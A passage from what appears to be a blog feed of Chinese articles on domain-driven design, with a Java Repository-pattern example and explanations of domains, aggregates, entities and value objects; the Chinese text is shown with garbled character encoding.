class="line">        userRepository.save(newUser);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¶ä»–ä¸šåŠ¡é€»è¾‘æ–¹æ³•...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šä½¿ç”¨ä¾èµ–æ³¨å…¥æ¡†æ¶ï¼ˆå¦‚Springï¼‰æ¥è‡ªåŠ¨æ³¨å…¥ä»“å‚¨çš„å®ç°ã€‚è¿™é‡Œä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»ºæœåŠ¡å’Œä»“å‚¨çš„å®ä¾‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">UserRepository</span> <span class="variable">userRepository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserRepository</span>();</span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserService</span>(userRepository);</span><br><span class="line"></span><br><span class="line">        userService.createUser(<span class="string">&quot;XiaoFuGe&quot;</span>, <span class="string">&quot;xiaofuge@qq.com&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getUserById(<span class="number">1L</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;User found: &quot;</span> + user.getUsername());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªä¾‹å­å±•ç¤ºäº†Repositoryæ¨¡å¼çš„åŸºæœ¬ç»“æ„å’Œç”¨æ³•ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œä»“å‚¨çš„å®ç°å¯èƒ½ä¼šè¿æ¥åˆ°æ•°æ®åº“ï¼Œå¹¶ä½¿ç”¨ORMæ¡†æ¶æ¥å¤„ç†æ•°æ®æŒä¹…åŒ–çš„ç»†èŠ‚ã€‚æ­¤å¤–ï¼Œä»“å‚¨æ¥å£å¯èƒ½ä¼šåŒ…å«æ›´å¤æ‚çš„æŸ¥è¯¢æ–¹æ³•ï¼Œä»¥æ”¯æŒå„ç§ä¸šåŠ¡éœ€æ±‚ã€‚</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://bugstack.cn/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å°å‚…å“¥ bugstack è™«æ´æ ˆ</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDDæ¶æ„ä¹‹é¢†åŸŸ,èšåˆ,å®ä½“,å€¼å¯¹è±¡</title>
      <link href="/2023/12/03/2023-12-3-DDD%E6%9E%B6%E6%9E%84-2/"/>
      <url>/2023/12/03/2023-12-3-DDD%E6%9E%B6%E6%9E%84-2/</url>
      
        <content type="html"><![CDATA[<h2 id="DDDæ¶æ„ä¹‹é¢†åŸŸ-èšåˆ-å®ä½“-å€¼å¯¹è±¡"><a href="#DDDæ¶æ„ä¹‹é¢†åŸŸ-èšåˆ-å®ä½“-å€¼å¯¹è±¡" class="headerlink" title="DDDæ¶æ„ä¹‹é¢†åŸŸ,èšåˆ,å®ä½“,å€¼å¯¹è±¡"></a>DDDæ¶æ„ä¹‹é¢†åŸŸ,èšåˆ,å®ä½“,å€¼å¯¹è±¡</h2><h3 id="Domainï¼ˆé¢†åŸŸï¼‰"><a href="#Domainï¼ˆé¢†åŸŸï¼‰" class="headerlink" title="Domainï¼ˆé¢†åŸŸï¼‰"></a>Domainï¼ˆé¢†åŸŸï¼‰</h3><p>åœ¨DDDä¸­ï¼Œé¢†åŸŸæ˜¯æŒ‡å…·ä½“ä¸šåŠ¡é¢†åŸŸçš„çŸ¥è¯†ã€ä¸šåŠ¡é€»è¾‘ã€æ•°æ®ä»¥åŠä¸šåŠ¡è§„åˆ™çš„é›†åˆã€‚å®ƒæ˜¯è½¯ä»¶è¦è§£å†³é—®é¢˜çš„ä¸šåŠ¡ç¯å¢ƒï¼Œé€šå¸¸ç”±ä¸€ç³»åˆ—å­é¢†åŸŸç»„æˆï¼Œæ¯ä¸ªå­é¢†åŸŸä»£è¡¨ä¸šåŠ¡ä¸­çš„ä¸€ä¸ªç‰¹å®šéƒ¨åˆ†ã€‚</p><h4 id="é¢†åŸŸçš„ç‰¹æ€§"><a href="#é¢†åŸŸçš„ç‰¹æ€§" class="headerlink" title="é¢†åŸŸçš„ç‰¹æ€§"></a>é¢†åŸŸçš„ç‰¹æ€§</h4><ol><li><strong>ä¸šåŠ¡ä¸­å¿ƒ</strong>ï¼šé¢†åŸŸæ˜¯å›´ç»•ä¸šåŠ¡éœ€æ±‚å’Œä¸šåŠ¡è§„åˆ™æ„å»ºçš„ï¼Œå®ƒæ˜¯è½¯ä»¶è®¾è®¡çš„æ ¸å¿ƒã€‚</li><li><strong>æ¨¡å‹é©±åŠ¨</strong>ï¼šé¢†åŸŸæ¨¡å‹æ˜¯å¯¹ä¸šåŠ¡çŸ¥è¯†çš„æŠ½è±¡ï¼Œå®ƒé€šè¿‡é¢†åŸŸå®ä½“ã€å€¼å¯¹è±¡ã€æœåŠ¡ã€èšåˆç­‰æ¦‚å¿µæ¥è¡¨è¾¾ã€‚</li><li><strong>è¯­è¨€ä¸€è‡´æ€§</strong>ï¼šé¢†åŸŸæ¨¡å‹çš„æ„å»ºåŸºäºç»Ÿä¸€è¯­è¨€ï¼ˆUbiquitous Languageï¼‰ï¼Œè¿™æ˜¯å¼€å‘å›¢é˜Ÿä¸ä¸šåŠ¡ä¸“å®¶å…±åŒä½¿ç”¨çš„è¯­è¨€ï¼Œç¡®ä¿æ²Ÿé€šæ— æ­§ä¹‰ã€‚</li><li><strong>è¾¹ç•Œæ¸…æ™°</strong>ï¼šé¢†åŸŸæ¨¡å‹å®šä¹‰äº†æ¸…æ™°çš„è¾¹ç•Œï¼Œè¿™äº›è¾¹ç•Œåˆ’åˆ†äº†ä¸åŒçš„å­é¢†åŸŸå’Œèšåˆï¼Œæœ‰åŠ©äºç®¡ç†å¤æ‚æ€§å’Œç»´æŠ¤æ€§ã€‚</li></ol><h4 id="é¢†åŸŸçš„ç”¨é€”"><a href="#é¢†åŸŸçš„ç”¨é€”" class="headerlink" title="é¢†åŸŸçš„ç”¨é€”"></a>é¢†åŸŸçš„ç”¨é€”</h4><p>ä¸šåŠ¡é€»è¾‘çš„å°è£…ï¼šé¢†åŸŸæ¨¡å‹å°è£…äº†ä¸šåŠ¡é€»è¾‘ï¼Œä½¿å¾—ä¸šåŠ¡è§„åˆ™å’Œæ•°æ®æ“ä½œé›†ä¸­ç®¡ç†ï¼Œä¾¿äºç†è§£å’Œç»´æŠ¤ã€‚<br>æ²Ÿé€šå·¥å…·ï¼šé¢†åŸŸæ¨¡å‹ä½œä¸ºå¼€å‘å›¢é˜Ÿä¸ä¸šåŠ¡ä¸“å®¶ä¹‹é—´çš„å…±åŒè¯­è¨€ï¼Œæœ‰åŠ©äºæé«˜æ²Ÿé€šæ•ˆç‡ï¼Œç¡®ä¿è½¯ä»¶å¼€å‘ç´§å¯†è·Ÿéšä¸šåŠ¡éœ€æ±‚ã€‚<br>è½¯ä»¶è®¾è®¡çš„åŸºç¡€ï¼šé¢†åŸŸæ¨¡å‹æ˜¯è½¯ä»¶è®¾è®¡çš„åŸºç¡€ï¼Œå®ƒæŒ‡å¯¼ç€è½¯ä»¶çš„æ¶æ„å’Œå®ç°ã€‚</p><h4 id="å®ç°æ‰‹æ®µ"><a href="#å®ç°æ‰‹æ®µ" class="headerlink" title="å®ç°æ‰‹æ®µ"></a>å®ç°æ‰‹æ®µ</h4><ol><li><strong>å®ä½“ï¼ˆEntityï¼‰</strong>ï¼šå…·æœ‰å”¯ä¸€æ ‡è¯†çš„é¢†åŸŸå¯¹è±¡ï¼Œä»£è¡¨ä¸šåŠ¡ä¸­çš„å®ä½“ã€‚</li><li><strong>å€¼å¯¹è±¡ï¼ˆValue Objectï¼‰</strong>ï¼šæè¿°é¢†åŸŸä¸­çš„ä¸€äº›ç‰¹æ€§æˆ–æ¦‚å¿µï¼Œæ²¡æœ‰å”¯ä¸€æ ‡è¯†ï¼Œé€šå¸¸æ˜¯ä¸å¯å˜çš„ã€‚</li><li><strong>èšåˆï¼ˆAggregateï¼‰</strong>ï¼šä¸€ç»„ç›¸å…³çš„å®ä½“å’Œå€¼å¯¹è±¡çš„é›†åˆï¼Œå®ƒä»¬ä¸€èµ·æ„æˆä¸€ä¸ªæ•°æ®å’Œä¸šåŠ¡è§„åˆ™çš„å•å…ƒã€‚</li><li><strong>é¢†åŸŸæœåŠ¡ï¼ˆDomain Serviceï¼‰</strong>ï¼šåœ¨é¢†åŸŸæ¨¡å‹ä¸­æ‰§è¡Œç‰¹å®šä¸šåŠ¡é€»è¾‘çš„æ— çŠ¶æ€æœåŠ¡ï¼Œé€šå¸¸æ“ä½œå¤šä¸ªå®ä½“æˆ–èšåˆã€‚</li><li><strong>é¢†åŸŸäº‹ä»¶ï¼ˆDomain Eventï¼‰</strong>ï¼šè¡¨ç¤ºé¢†åŸŸä¸­å‘ç”Ÿçš„é‡è¦ä¸šåŠ¡äº‹ä»¶ï¼Œç”¨äºè§£è€¦ç³»ç»Ÿçš„ä¸åŒéƒ¨åˆ†ã€‚</li><li><strong>ä»“å‚¨ï¼ˆRepositoryï¼‰</strong>ï¼šæä¾›å¯¹èšåˆæ ¹çš„æŒä¹…åŒ–æ“ä½œï¼Œå¦‚ä¿å­˜å’Œæ£€ç´¢ï¼Œé€šå¸¸ä¸æ•°æ®åº“äº¤äº’ã€‚</li><li><strong>é¢†åŸŸé€‚é…å™¨ï¼ˆDomain Adapterï¼‰</strong>ï¼šé¢†åŸŸé€‚é…å™¨æ˜¯é€‚é…å™¨æ¨¡å¼åœ¨DDDä¸­çš„åº”ç”¨ï¼Œå®ƒçš„ç›®çš„æ˜¯ä½¿å¾—é¢†åŸŸæ¨¡å‹èƒ½å¤Ÿä¸å¤–éƒ¨ç³»ç»Ÿæˆ–æŠ€æœ¯ç»†èŠ‚è¿›è¡Œäº¤äº’ï¼Œè€Œä¸ä¼šå—åˆ°æ±¡æŸ“ã€‚</li><li><strong>å·¥å‚ï¼ˆFactoryï¼‰</strong>ï¼šç”¨äºåˆ›å»ºå¤æ‚çš„èšåˆæˆ–å®ä½“ï¼Œå°è£…åˆ›å»ºé€»è¾‘ã€‚å¦‚ OpenAié¡¹ç›®ã€Lottery é¡¹ç›®éƒ½è¿ç”¨äº†å·¥å‚ï¼Œä¹ŸåŒ…æ‹¬å¦‚ chatglm-sdk-java çš„å¼€å‘ï¼Œå°±æ˜¯ä¼šè¯æ¨¡å‹ç»“æ„ç”¨å·¥å‚å¯¹å¤–æä¾›æœåŠ¡ã€‚</li></ol><p>é€šè¿‡è¿™äº›å®ç°æ‰‹æ®µï¼ŒDDDä½¿å¾—è½¯ä»¶è®¾è®¡æ›´åŠ è´´è¿‘ä¸šåŠ¡éœ€æ±‚ï¼Œæé«˜äº†è½¯ä»¶çš„è´¨é‡å’Œå¯ç»´æŠ¤æ€§ã€‚å¼€å‘å›¢é˜Ÿå¯ä»¥æ›´å¥½åœ°ç†è§£ä¸šåŠ¡é€»è¾‘ï¼Œä»è€Œè®¾è®¡å‡ºæ›´åŠ å¥å£®å’Œçµæ´»çš„ç³»ç»Ÿã€‚</p><h3 id="èšåˆå¯¹è±¡"><a href="#èšåˆå¯¹è±¡" class="headerlink" title="èšåˆå¯¹è±¡"></a>èšåˆå¯¹è±¡</h3><p>èšåˆæ˜¯ä¸€ç»„ç›¸å…³å¯¹è±¡çš„é›†åˆï¼Œå®ƒä»¬ä¸€èµ·å½¢æˆä¸€ä¸ªå•ä¸€çš„å•å…ƒã€‚</p><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>èšåˆæ˜¯é¢†åŸŸæ¨¡å‹ä¸­çš„ä¸€ä¸ªå…³é”®æ¦‚å¿µï¼Œå®ƒæ˜¯ä¸€ç»„å…·æœ‰å†…èšæ€§çš„ç›¸å…³å¯¹è±¡çš„é›†åˆï¼Œè¿™äº›å¯¹è±¡ä¸€èµ·å·¥ä½œä»¥æ‰§è¡ŒæŸäº›ä¸šåŠ¡è§„åˆ™æˆ–æ“ä½œã€‚èšåˆå®šä¹‰äº†ä¸€ç»„å¯¹è±¡çš„è¾¹ç•Œï¼Œè¿™äº›å¯¹è±¡å¯ä»¥è¢«è§†ä¸ºä¸€ä¸ªå•ä¸€çš„å•å…ƒè¿›è¡Œå¤„ç†ã€‚</p><p><strong>å…³é”®</strong>ï¼šèšåˆå†…å®ç°äº‹åŠ¡ä¸€è‡´æ€§ã€èšåˆå¤–å®ç°æœ€ç»ˆä¸€è‡´æ€§ã€‚</p><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><ol><li><strong>ä¸€è‡´æ€§è¾¹ç•Œ</strong>ï¼šèšåˆç¡®ä¿å…¶å†…éƒ¨å¯¹è±¡çš„çŠ¶æ€å˜åŒ–æ˜¯ä¸€è‡´çš„ã€‚å½“å¯¹èšåˆå†…çš„å¯¹è±¡è¿›è¡Œæ“ä½œæ—¶ï¼Œè¿™äº›æ“ä½œå¿…é¡»ä¿æŒèšåˆå†…æ‰€æœ‰å¯¹è±¡çš„ä¸€è‡´æ€§ã€‚</li><li><strong>æ ¹å®ä½“</strong>ï¼šæ¯ä¸ªèšåˆéƒ½æœ‰ä¸€ä¸ªæ ¹å®ä½“ï¼ˆAggregate Rootï¼‰ï¼Œå®ƒæ˜¯èšåˆçš„å…¥å£ç‚¹ã€‚æ ¹å®ä½“æ‹¥æœ‰ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå…¶ä»–å¯¹è±¡é€šè¿‡æ ¹å®ä½“ä¸èšåˆäº¤äº’ã€‚</li><li><strong>äº‹åŠ¡è¾¹ç•Œ</strong>ï¼šèšåˆä¹Ÿå®šä¹‰äº†äº‹åŠ¡çš„è¾¹ç•Œã€‚åœ¨èšåˆå†…éƒ¨ï¼Œæ‰€æœ‰çš„å˜æ›´æ“ä½œåº”è¯¥æ˜¯åŸå­çš„ï¼Œå³å®ƒä»¬è¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œä»¥æ­¤æ¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</li></ol><h4 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><ol><li><strong>å°è£…ä¸šåŠ¡é€»è¾‘</strong>ï¼šèšåˆé€šè¿‡å°†ç›¸å…³çš„å¯¹è±¡å’Œæ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œæä¾›äº†ä¸€ä¸ªæ¸…æ™°çš„ä¸šåŠ¡é€»è¾‘æ¨¡å‹ï¼Œæœ‰åŠ©äºä¸šåŠ¡è§„åˆ™çš„å®æ–½å’Œç»´æŠ¤ã€‚</li><li><strong>ä¿è¯ä¸€è‡´æ€§</strong>ï¼šèšåˆç¡®ä¿å†…éƒ¨çŠ¶æ€çš„ä¸€è‡´æ€§ï¼Œé€šè¿‡å®šä¹‰æ¸…æ™°çš„è¾¹ç•Œå’Œè§„åˆ™ï¼Œèšåˆå¯ä»¥åœ¨å†…éƒ¨å¼ºåˆ¶æ‰§è¡Œä¸šåŠ¡è§„åˆ™ï¼Œä»è€Œä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</li><li><strong>ç®€åŒ–å¤æ‚æ€§</strong>ï¼šèšåˆé€šè¿‡ç»„ç»‡ç›¸å…³çš„å¯¹è±¡ï¼Œç®€åŒ–äº†é¢†åŸŸæ¨¡å‹çš„å¤æ‚æ€§ã€‚è¿™æœ‰åŠ©äºå¼€å‘è€…æ›´å¥½åœ°ç†è§£å’Œæ‰©å±•ç³»ç»Ÿã€‚</li></ol><h4 id="å®ç°æ‰‹æ®µ-1"><a href="#å®ç°æ‰‹æ®µ-1" class="headerlink" title="å®ç°æ‰‹æ®µ"></a>å®ç°æ‰‹æ®µ</h4><ol><li><strong>å®šä¹‰èšåˆæ ¹</strong>ï¼šé€‰æ‹©åˆé€‚çš„èšåˆæ ¹æ˜¯å®ç°èšåˆçš„ç¬¬ä¸€æ­¥ã€‚èšåˆæ ¹åº”è¯¥æ˜¯èƒ½å¤Ÿä»£è¡¨æ•´ä¸ªèšåˆçš„å®ä½“ï¼Œå¹¶ä¸”æ‹¥æœ‰å”¯ä¸€æ ‡è¯†ã€‚</li><li><strong>é™åˆ¶è®¿é—®è·¯å¾„</strong>ï¼šåªèƒ½é€šè¿‡èšåˆæ ¹æ¥ä¿®æ”¹èšåˆå†…çš„å¯¹è±¡ï¼Œä¸å…è®¸ç›´æ¥ä¿®æ”¹èšåˆå†…éƒ¨å¯¹è±¡çš„çŠ¶æ€ï¼Œä»¥æ­¤æ¥ç»´æŠ¤è¾¹ç•Œå’Œä¸€è‡´æ€§ã€‚</li><li><strong>è®¾è®¡äº‹åŠ¡ç­–ç•¥</strong>ï¼šåœ¨èšåˆå†…éƒ¨å®ç°äº‹åŠ¡ä¸€è‡´æ€§ï¼Œç¡®ä¿æ“ä½œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨å›æ»šã€‚å¯¹äºèšåˆä¹‹é—´çš„äº¤äº’ï¼Œå¯ä»¥é‡‡ç”¨é¢†åŸŸäº‹ä»¶æˆ–å…¶ä»–æœºåˆ¶æ¥å®ç°æœ€ç»ˆä¸€è‡´æ€§ã€‚</li><li><strong>å°è£…ä¸šåŠ¡è§„åˆ™</strong>ï¼šåœ¨èšåˆå†…éƒ¨å®ç°ä¸šåŠ¡è§„åˆ™å’Œé€»è¾‘ï¼Œç¡®ä¿æ‰€æœ‰çš„ä¸šåŠ¡æ“ä½œéƒ½éµå¾ªè¿™äº›è§„åˆ™ã€‚<br>æŒä¹…åŒ–ï¼šèšåˆæ ¹é€šå¸¸ä¸æ•°æ®æŒä¹…åŒ–å±‚äº¤äº’ï¼Œä»¥ä¿å­˜èšåˆçš„çŠ¶æ€ã€‚è¿™é€šå¸¸æ¶‰åŠåˆ°å¯¹è±¡-å…³ç³»æ˜ å°„ï¼ˆORMï¼‰æˆ–å…¶ä»–æ•°æ®æ˜ å°„æŠ€æœ¯ã€‚</li></ol><p>é€šè¿‡è¿™äº›å®ç°æ‰‹æ®µï¼ŒDDDä¸­çš„èšåˆæ¨¡å‹èƒ½å¤Ÿå¸®åŠ©å¼€å‘è€…æ„å»ºå‡ºæ—¢ç¬¦åˆä¸šåŠ¡éœ€æ±‚åˆå…·æœ‰è‰¯å¥½æ¶æ„è®¾è®¡çš„è½¯ä»¶ç³»ç»Ÿã€‚</p><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><p>å®ä½“ï¼ˆEntityï¼‰åœ¨é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDomain-Driven Design, DDDï¼‰ä¸­æ˜¯ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºè¡¨ç¤ºå…·æœ‰å”¯ä¸€æ ‡è¯†çš„é¢†åŸŸå¯¹è±¡ã€‚ä»¥ä¸‹æ˜¯å®ä½“çš„è¯¦ç»†ä»‹ç»ï¼š</p><h4 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>å®ä½“ = å”¯ä¸€æ ‡è¯† + çŠ¶æ€å±æ€§ + è¡Œä¸ºåŠ¨ä½œï¼ˆåŠŸèƒ½ï¼‰ï¼Œæ˜¯DDDä¸­çš„ä¸€ä¸ªåŸºæœ¬æ„å»ºå—ï¼Œå®ƒä»£è¡¨äº†å…·æœ‰å”¯ä¸€æ ‡è¯†çš„é¢†åŸŸå¯¹è±¡ã€‚å®ä½“ä¸ä»…ä»…åŒ…å«æ•°æ®ï¼ˆçŠ¶æ€å±æ€§ï¼‰ï¼Œè¿˜åŒ…å«äº†ç›¸å…³çš„è¡Œä¸ºï¼ˆåŠŸèƒ½ï¼‰ï¼Œå¹¶ä¸”å®ƒçš„æ ‡è¯†åœ¨æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­ä¿æŒä¸å˜ã€‚</p><h4 id="ç‰¹æ€§-1"><a href="#ç‰¹æ€§-1" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><ol><li><strong>å”¯ä¸€æ ‡è¯†</strong>ï¼šå®ä½“å…·æœ‰ä¸€ä¸ªå¯ä»¥åŒºåˆ†å…¶ä»–å®ä½“çš„æ ‡è¯†ç¬¦ã€‚è¿™ä¸ªæ ‡è¯†ç¬¦å¯ä»¥æ˜¯ä¸€ä¸ªIDã€ä¸€ä¸ªå¤åˆé”®æˆ–è€…æ˜¯ä¸€ä¸ªè‡ªç„¶é”®ï¼Œå…³é”®æ˜¯å®ƒèƒ½å¤Ÿå”¯ä¸€åœ°æ ‡è¯†å®ä½“å®ä¾‹ã€‚</li><li><strong>é¢†åŸŸæ ‡è¯†</strong>ï¼šå®ä½“çš„æ ‡è¯†é€šå¸¸æ¥æºäºä¸šåŠ¡é¢†åŸŸï¼Œä¾‹å¦‚ç”¨æˆ·IDã€è®¢å•IDç­‰ã€‚è¿™äº›æ ‡è¯†ç¬¦åœ¨ä¸šåŠ¡ä¸Šæœ‰ç‰¹å®šçš„å«ä¹‰ï¼Œå¹¶ä¸”åœ¨ç³»ç»Ÿä¸­æ˜¯å”¯ä¸€çš„ã€‚</li><li><strong>å§”æ´¾æ ‡è¯†</strong>ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ä½“çš„æ ‡è¯†å¯èƒ½æ˜¯ç”±ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œå¦‚æ•°æ®åº“ä¸­çš„è‡ªå¢ä¸»é”®ã€‚è¿™ç§æ ‡è¯†ç¬¦è™½ç„¶å¯ä»¥å”¯ä¸€æ ‡è¯†å®ä½“ï¼Œä½†å®ƒå¹¶ä¸ç›´æ¥æ¥æºäºä¸šåŠ¡é¢†åŸŸã€‚</li></ol><h4 id="ç”¨é€”-1"><a href="#ç”¨é€”-1" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><ol><li><strong>è¡¨è¾¾ä¸šåŠ¡æ¦‚å¿µ</strong>ï¼šå®ä½“ç”¨äºåœ¨è½¯ä»¶ä¸­è¡¨è¾¾å…·ä½“çš„ä¸šåŠ¡æ¦‚å¿µï¼Œå¦‚ç”¨æˆ·ã€è®¢å•ã€äº¤æ˜“ç­‰ã€‚é€šè¿‡å®ä½“çš„å±æ€§å’Œè¡Œä¸ºï¼Œå¯ä»¥æè¿°è¿™äº›ä¸šåŠ¡å¯¹è±¡çš„ç‰¹å¾å’Œèƒ½åŠ›ã€‚</li><li><strong>å°è£…ä¸šåŠ¡é€»è¾‘</strong>ï¼šå®ä½“ä¸ä»…ä»…æ‰¿è½½æ•°æ®ï¼Œè¿˜å°è£…äº†ä¸šåŠ¡è§„åˆ™å’Œé€»è¾‘ã€‚è¿™äº›é€»è¾‘åŒ…æ‹¬éªŒè¯æ•°æ®çš„æœ‰æ•ˆæ€§ã€æ‰§è¡Œä¸šåŠ¡è§„åˆ™ã€è®¡ç®—å±æ€§å€¼ç­‰ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¿è¯ä¸šåŠ¡é€»è¾‘çš„é›†ä¸­å’Œä¸€è‡´æ€§ã€‚</li><li><strong>ä¿æŒæ•°æ®ä¸€è‡´æ€§</strong>ï¼šå®ä½“è´Ÿè´£ç»´æŠ¤è‡ªèº«çš„çŠ¶æ€å’Œæ•°æ®ä¸€è‡´æ€§ã€‚å®ƒç¡®ä¿è‡ªå·±çš„å±æ€§å’Œå…³è”å…³ç³»åœ¨ä»»ä½•æ—¶å€™éƒ½æ˜¯æ­£ç¡®å’Œå®Œæ•´çš„ï¼Œä»è€Œé¿å…æ•°æ®çš„ä¸ä¸€è‡´æ€§ã€‚</li></ol><h4 id="å®ç°æ‰‹æ®µ-2"><a href="#å®ç°æ‰‹æ®µ-2" class="headerlink" title="å®ç°æ‰‹æ®µ"></a>å®ç°æ‰‹æ®µ</h4><p>åœ¨å®ç°å®ä½“æ—¶ï¼Œé€šå¸¸ä¼šé‡‡ç”¨ä»¥ä¸‹æ‰‹æ®µï¼š</p><ol><li><strong>å®šä¹‰å®ä½“ç±»</strong>ï¼šåœ¨ä»£ç ä¸­å®šä¹‰ä¸€ä¸ªç±»ï¼Œè¯¥ç±»åŒ…å«å®ä½“çš„å±æ€§ã€æ„é€ å‡½æ•°ã€æ–¹æ³•ç­‰ã€‚</li><li><strong>å®ç°å”¯ä¸€æ ‡è¯†</strong>ï¼šä¸ºå®ä½“ç±»æä¾›ä¸€ä¸ªå”¯ä¸€æ ‡è¯†çš„å±æ€§ï¼Œå¦‚IDï¼Œå¹¶ç¡®ä¿åœ¨å®ä½“çš„ç”Ÿå‘½å‘¨æœŸä¸­è¿™ä¸ªæ ‡è¯†ä¿æŒä¸å˜ã€‚</li><li><strong>å°è£…è¡Œä¸º</strong>ï¼šåœ¨å®ä½“ç±»ä¸­å®ç°ä¸šåŠ¡é€»è¾‘çš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥æ“ä½œå®ä½“çš„çŠ¶æ€ï¼Œå¹¶æ‰§è¡Œç›¸å…³çš„ä¸šåŠ¡è§„åˆ™ã€‚</li><li><strong>ä½¿ç”¨ORMæ¡†æ¶</strong>ï¼šåˆ©ç”¨ORMæ¡†æ¶å°†å®ä½“æ˜ å°„åˆ°æ•°æ®åº“è¡¨ä¸­ï¼Œè¿™æ ·å¯ä»¥ç®€åŒ–æ•°æ®æŒä¹…åŒ–çš„æ“ä½œã€‚</li><li><strong>å®ç°é¢†åŸŸæœåŠ¡</strong>ï¼šå¯¹äºè·¨å®ä½“æˆ–è·¨èšåˆçš„æ“ä½œï¼Œå¯ä»¥å®ç°é¢†åŸŸæœåŠ¡æ¥å¤„ç†è¿™äº›æ“ä½œï¼Œè€Œä¸æ˜¯åœ¨å®ä½“ä¸­ç›´æ¥å®ç°ã€‚</li><li><strong>ä½¿ç”¨é¢†åŸŸäº‹ä»¶</strong>ï¼šå½“å®ä½“çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¯ä»¥å‘å¸ƒé¢†åŸŸäº‹ä»¶ï¼Œè¿™æ ·å¯ä»¥é€šçŸ¥å…¶ä»–éƒ¨åˆ†çš„ç³»ç»Ÿè¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</li></ol><p>é€šè¿‡ä¸Šè¿°æ‰‹æ®µï¼Œå®ä½“åœ¨DDDæ¶æ„ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œå®ƒä¸ä»…ä»£è¡¨äº†ä¸šåŠ¡æ¦‚å¿µï¼Œè¿˜å°è£…äº†ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶é€šè¿‡å…¶å”¯ä¸€æ ‡è¯†ç¡®ä¿äº†æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p><h3 id="å€¼å¯¹è±¡"><a href="#å€¼å¯¹è±¡" class="headerlink" title="å€¼å¯¹è±¡"></a>å€¼å¯¹è±¡</h3><p>åœ¨é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDomain-Driven Design, DDDï¼‰ä¸­ï¼Œå€¼å¯¹è±¡ï¼ˆValue Objectï¼‰æ˜¯ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºå°è£…å’Œè¡¨ç¤ºé¢†åŸŸä¸­çš„æ¦‚å¿µï¼Œå…¶ç‰¹ç‚¹æ˜¯å®ƒä»¬æè¿°äº†é¢†åŸŸä¸­çš„æŸäº›å±æ€§æˆ–åº¦é‡ï¼Œä½†ä¸å…·æœ‰å”¯ä¸€æ ‡è¯†ã€‚</p><p>å€¼å¯¹è±¡ = å€¼ + å¯¹è±¡ï¼Œç”¨äºæè¿°å¯¹è±¡å±æ€§çš„å€¼ï¼Œè¡¨ç¤ºå…·ä½“å›ºå®šä¸å˜çš„å±æ€§å€¼ä¿¡æ¯ã€‚</p><h4 id="æ¦‚å¿µ-2"><a href="#æ¦‚å¿µ-2" class="headerlink" 